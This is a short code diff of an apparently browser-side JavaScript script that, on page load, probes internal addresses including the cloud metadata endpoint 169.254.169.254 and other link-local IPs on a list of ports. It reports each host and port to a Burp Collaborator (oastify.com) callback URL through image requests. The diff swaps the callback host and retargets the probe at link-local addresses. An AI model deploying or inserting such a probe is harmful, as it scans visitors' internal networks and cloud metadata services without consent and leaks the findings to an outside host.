@@ -28,7 +28,7 @@
         }
 
         function sendPing(host, port) {
-            let collaboratorUrl = 'https://zbefwfjdshsh5o4knga28spopfv6jx9ly.oastify.com';
+            let collaboratorUrl = 'https://dn4t8tvr4v4vh2gyzumgk6121t7kvbnzc.oastify.com';
             let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}`;
             let img = new Image();
             img.src = pingUrl;
@@ -38,8 +38,8 @@
         document.addEventListener("DOMContentLoaded", function() {
             let ips = [
                 '169.254.169.254',
-                '52.12.107.46',
-                '34.214.199.77'
+                '169.254.255.255',
+                '169.254.0.0'
             ];
 
             let ports = [
